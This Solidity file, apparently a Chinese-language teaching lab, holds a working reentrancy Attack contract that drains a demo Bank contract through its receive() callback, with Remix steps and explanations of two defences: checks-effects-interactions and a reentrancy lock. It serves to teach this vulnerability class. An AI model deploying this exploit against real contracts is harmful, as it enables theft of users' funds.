// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
	攻击流程
	攻击原理就是通过receive()回退函数循环调用Bank合约的withdraw()函数
	Remix实验:
	1. 部署Bank合约, 调用deposit()函数, 转入20 ETH
	2. 切换到攻击者钱包, 部署Attack合约
	3. 调用Atack合约的attack()函数发动攻击, 调用时需转账1 ETH
	4. 调用Bank合约的getBalance()函数, 发现余额已被提空
	5. 调用Attack合约的getBalance()函数, 可以看到余额变为21 ETH, 重入攻击成功

	预防办法
	1. 检查-影响-交互模式(checks-effect-interaction)
	2. 重入锁


	检查-影响-交互模式
	检查-影响-交互模式强调编写函数时, 要先检查状态变量是否符合要求, 紧接着更
	新状态变量(例如余额), 最后再和别的合约交互(TODO: 交互失败后可以回滚吗?);
	如果将Bank合约withdraw()函数中的更新余额提前到转账ETH之前就可以修复:
		function withdraw() external {
			uint256 balance = balanceOf[msg.sender];
			require(balance > 0, "Insufficient balance");
			// 检查-效果-交互模式(checks-effect-interaction): 先更新余额变化, 再发送ETH
			// 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了, 不能通过上面的检查
			balanceOf[msg.sender] = 0;
			(bool success, ) = msg.sender.call{value: balance}("");
			require(success, "Failed to send Ether");
		}

	重入锁
	重入锁是一种防止重入函数的修饰器(modifier), 它包含一个默认为0的状态
	变量_status; 被nonReentrant重入锁修饰的函数, 在第一次调用时会检查_status
	是否为0, 紧接着将_status的值改为1, 调用结束后才会再改为0; 当攻击合约在
	调用结束前第二次的调用就会报错, 重入攻击失败

		uint256 private _status; // 重入锁

		// 重入锁
		modifier nonReentrant() {
			// 在第一次调用 nonReentrant 时, _status 将是 0
			require(_status == 0, "ReentrancyGuard: reentrant call");
			// 在此之后对 nonReentrant 的任何调用都将失败
			_status = 1;
			_;
			// 调用结束，将 _status 恢复为0
			_status = 0;
		}

	只需要用nonReentrant重入锁修饰withdraw()函数, 就可以预防重入攻击
		// 用重入锁保护有漏洞的函数
		function withdraw() external nonReentrant{
			uint256 balance = balanceOf[msg.sender];
			require(balance > 0, "Insufficient balance");

			(bool success, ) = msg.sender.call{value: balance}("");
			require(success, "Failed to send Ether");

			balanceOf[msg.sender] = 0;
		}
	
*/

contract Attack {
    Bank public bank; // Bank合约地址

    // 初始化Bank合约地址
    constructor(Bank _bank) {
        bank = _bank;
    }

    // 回调函数, 用于重入攻击Bank合约, 反复的调用目标的withdraw函数
    receive() external payable {
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    // 攻击函数, 调用时 msg.value 设为 1 ether
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
